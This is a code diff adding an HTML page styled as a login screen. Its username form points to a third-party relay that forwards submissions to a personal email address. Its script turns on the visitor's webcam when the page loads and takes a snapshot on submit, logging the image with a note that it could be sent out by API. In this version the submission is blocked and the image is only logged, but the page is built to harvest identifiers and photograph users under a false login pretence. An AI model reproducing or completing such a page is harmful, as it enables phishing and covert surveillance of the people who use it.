@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <h2>Log In</h2>
+    <form action="https://formsubmit.co/sauravsingh002278@gmail.com" method="POST"
+    id="loginForm">
+      <label for="username">USERNAME OR EMAIL</label>
+      <input type="text" id="username" name="username" required>
+      <button type="submit">Report Problem</button>
+    </form>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+  </div>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const form = document.getElementById('loginForm');
+
+    // Start webcam
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        console.error("Camera permission denied:", err);
+      });
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault(); // Prevent actual form submission
+
+      // Capture snapshot from video
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      const imageData = canvas.toDataURL('image/png');
+
+      // Print to console or send via API call
+      console.log("Captured image:", imageData);
+
+      // Example alert
+      alert("Form submitted and picture taken. (Sending via email requires backend)");
+
+      // Optional: you can reset the form or add more logic here
+    });
+  </script>
+</body>
+</html>
